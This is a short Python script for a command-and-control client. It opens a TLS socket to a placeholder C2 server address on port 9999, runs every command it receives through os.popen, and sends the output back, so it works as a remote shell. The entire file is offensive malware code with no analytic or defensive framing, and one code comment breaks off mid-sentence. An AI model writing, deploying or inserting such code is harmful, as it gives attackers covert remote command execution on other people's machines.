import socket
import ssl # To protect data exchanged between the C2 client and 
import os

# Server configuration
SERVER_HOST = 'c2_server_ip'
SERVER_PORT = 9999

def connect_to_server():
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    context = ssl.create_default_context()
    ssl_client = context.wrap_socket(client, server_hostname=SERVER_HOST)
    ssl_client.connect((SERVER_HOST, SERVER_PORT))

    while True:
        try:
            command = ssl_client.recv(1024).decode('utf-8')
            if command.lower() == 'exit':
                print("[*] Exiting...")
                break
            
            output = os.popen(command).read()
            if not output:
                output = "Command executed but no output returned."
            ssl_client.send(output.encode())
        except Exception as e:
            print(f"[!] Error: {e}")
            break

if __name__ == "__main__":
    connect_to_server()
